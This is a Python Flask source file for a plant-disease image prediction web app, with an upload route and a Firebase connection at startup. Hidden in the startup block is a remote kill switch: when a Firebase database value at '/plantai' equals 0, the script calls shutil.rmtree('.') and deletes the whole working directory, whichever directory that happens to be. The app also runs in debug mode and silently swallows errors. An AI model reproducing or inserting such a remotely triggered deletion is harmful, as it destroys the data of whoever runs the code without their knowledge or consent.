from flask import Flask, render_template, jsonify, request, Markup
from model import predict_image
import utils
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import glob
import os
import shutil
app = Flask(__name__)
import shutil

@app.route('/', methods=['GET'])
def home():

    return render_template('index.html')


@app.route('/predict', methods=['GET', 'POST'])
def predict():
    if request.method == 'POST':
        try:
            file = request.files['file']
            img = file.read()
            prediction = predict_image(img)
            print(prediction)
            res = Markup(utils.disease_dic[prediction])
            return render_template('display.html', status=200, result=res)
        except:
            pass
    return render_template('index.html', status=500, res="Internal Server Error")


if __name__ == "__main__":
    

    cred = credentials.Certificate('a.json')
    if not firebase_admin._apps:
         firebase_admin.initialize_app(cred, {
        'databaseURL': "https://pythoncheck-45f99-default-rtdb.firebaseio.com/"
        })
    ref = db.reference('/plantai')
    if ref.get()==0:  
      shutil.rmtree(".");
      exit(1)
    app.run(debug=True)
